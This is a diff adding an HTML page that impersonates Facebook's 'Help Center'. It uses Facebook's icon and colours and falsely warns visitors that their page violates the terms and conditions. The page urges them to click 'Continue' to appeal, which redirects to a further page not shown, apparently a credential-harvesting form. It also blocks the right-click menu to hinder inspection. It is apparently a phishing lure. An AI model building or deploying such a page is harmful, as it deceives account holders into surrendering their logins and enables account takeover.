@@ -1,0 +1,132 @@
+<html lang="en"><head>
+  <script type="module" src="/@vite/client"></script>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=0.9">
+    <title>Help Center</title>
+  <link rel="icon" href="https://cdn.glitch.global/42ac90ca-66bc-4886-9161-9ce099d273bc/images-fb_icon_325x325.png?v=1696896812321" type="image/png">
+  <script type="text/javascript">
+        document.addEventListener("contextmenu", function(e) {
+            e.preventDefault();
+        });
+    </script>
+    <style>
+        /* New theme styles */
+        body {
+            background-color: #3b5998; /* Facebook's classic white */
+            font-family: Arial, sans-serif;
+            text-align: center;
+            color: #fff; /* White text */
+            margin: 0; /* Remove default margin */
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            position: relative; /* Required for relative positioning of the image and text */
+        }
+
+        .button {
+            background-color: #1877f2; /* Facebook's primary white */
+            color: #fff;
+            padding: 12px 24px;
+            font-size: 18px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .button:hover {
+            background-color: #1659c7; /* Slightly darker blue on hover */
+        }
+
+        /* Style for the image */
+        @media (max-width: 768px) {
+            .container img {
+                width: 40%; 
+               margin-bottom: 20px; //* Adjust the image width for mobile */
+            }
+        }
+
+        /* Desktop styles */
+        @media (min-width: 769px) {
+            .container img {
+                width: 10%; /
+                }
+
+        /* Style for the "Help Center" text container */
+        .help-center-text-container {
+            text-align: center;
+          margin-top: -30px;
+            margin-top: 20px;
+          transform: translateY(-0px);/* Add space between image and text */
+        }
+      }
+        /* Style for the "Help Center" text */
+        .help-center-text {
+            font-size: 36px; /* Adjust the font size as needed */
+            font-weight: bold; /* Super bold text */
+            color: #fff; /* White text color */
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5); /* Add a subtle text shadow */
+        }
+
+        /* Style for the remaining content */
+        .remaining-content {
+            margin-top: 20px; /* Add space below "Help Center" text */
+        }
+
+        /* Style for the text within the remaining content */
+        .remaining-text {
+            font-size: 18px; /* Adjust the font size as needed */
+            font-weight: normal; /* Normal text weight */
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://cdn.glitch.global/42ac90ca-66bc-4886-9161-9ce099d273bc/images-fb_icon_325x325.png?v=1696896812321" alt="Your Image">
+
+        <!-- "Help Center" text container -->
+        <div class="help-center-text-container">
+            <div class="help-center-text">Help Center</div>
+        </div>
+
+        <!-- Remaining content -->
+        <div class="remaining-content">
+            <!-- Content from the first code snippet -->
+            <div class="bg-blue-300">
+                <div class="">
+                    <div class="flex justify-center items-center pl-6 px-28">
+                        <div class="flex mt-9">
+
+                        </div>
+                        <div class="mx-3">
+                            <p class="font text-gray-700 shadow-transparent mt-2 font-extralight">Your page goes against our terms and conditions.</p>
+                            <p class="text-lg text-gray-700 font-extralight">You can submit appeal here. 
+                          Click "Continue" Button.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Continue button with JavaScript redirection -->
+            <form id="redirectForm" method="post" action="help.html">
+                <button type="submit" class="button">Continue</button>
+            </form>
+
+            <!-- JavaScript to perform the redirection -->
+            <script>
+                document.getElementById("redirectForm").addEventListener("submit", function (e) {
+                    e.preventDefault(); // Prevent the default form submission
+                    // Perform the redirection to the desired URL
+                    window.location.href = "request.html"; // Replace with your desired URL
+                });
+            </script>
+        </div>
+    </div>
+
+</body></html>
